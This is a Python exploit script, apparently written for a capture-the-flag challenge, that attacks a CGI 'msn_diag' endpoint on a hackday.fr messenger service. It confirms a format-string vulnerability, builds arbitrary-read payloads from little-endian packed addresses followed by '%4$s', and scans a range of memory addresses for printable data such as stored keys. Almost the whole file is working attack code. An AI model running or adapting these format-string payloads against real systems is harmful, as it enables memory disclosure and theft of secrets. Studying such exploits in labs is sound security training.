#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg_raw(body_bytes):
    """Send raw bytes as body parameter"""
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            data = resp.read()
            return data
    except Exception as e:
        return f"ERROR: {e}".encode()

def send_msg(body):
    encoded = urllib.parse.quote(body, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            data = resp.read().decode('latin-1', errors='replace')
            return data
    except Exception as e:
        return f"ERROR: {e}"

# We know:
# - position 1 is a stack pointer (changes each request due to ASLR)
# - position 3 is always 0x8049530 (global, in binary)
# - input starts at position 4 (when using AAAA%p%p%p%p we saw 0x41414141 at pos 4)
# 
# WAIT - in our test earlier with "AAAA%p%p%p..." -> AAAA was at position 4
# But with "%4$p" we got 0x70243425 which is b'%4$p' in little-endian!
# That means with %n$p notation, our input IS at position 4
# So we can put an address at the start, then use %4$s to dereference it!

print("=== Confirm input is at position 4 ===")
# Put BBBB at start, check position 4
result = send_msg("BBBB%4$p")
print(result.strip())  # Should see 0x42424242

print()
print("=== Try arbitrary read: put address + %4$s ===")
# Address of 0x8049530 - try to read what it contains as a string
# Pack address in little-endian
addr = 0x8049530
addr_bytes = struct.pack('<I', addr)
# Put the address bytes first, then %4$s to dereference position 4 (our input)
payload = addr_bytes + b'%4$s'
result = send_msg_raw(payload)
print(f"Reading at 0x8049530: {repr(result)}")

print()
print("=== Scan nearby addresses ===")
# Scan around 0x8049530 (data segment start area)
# Keys are often stored as global char arrays
for offset in range(-0x200, 0x300, 0x10):
    target_addr = 0x8049530 + offset
    addr_bytes = struct.pack('<I', target_addr)
    payload = addr_bytes + b'%4$s'
    result = send_msg_raw(payload)
    # Look for printable content
    try:
        decoded = result[result.find(b'DIAG ')+5:].rstrip()
        if len(decoded) > 2 and all(0x20 <= b < 0x7f for b in decoded[:min(4,len(decoded))]):
            print(f"0x{target_addr:08x}: {repr(decoded)}")
    except:
        pass
    time.sleep(0.05)
